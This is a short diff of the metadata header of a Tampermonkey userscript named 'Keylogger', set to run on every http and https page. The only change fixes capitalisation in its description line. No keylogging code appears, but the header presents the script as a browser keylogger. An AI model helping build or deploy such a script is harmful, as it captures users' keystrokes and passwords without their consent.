@@ -2,7 +2,7 @@
 // @name Keylogger
 // @namespace http://tampermonkey.net/
 // @version 1.0
-// @description A simple Keylogger for Tampermonkey. (Browser Extionsion)
+// @description A simple keylogger for Tampermonkey. (Browser Extionsion)
 // @author Lyzev
 // @include http://*
 // @include https://*
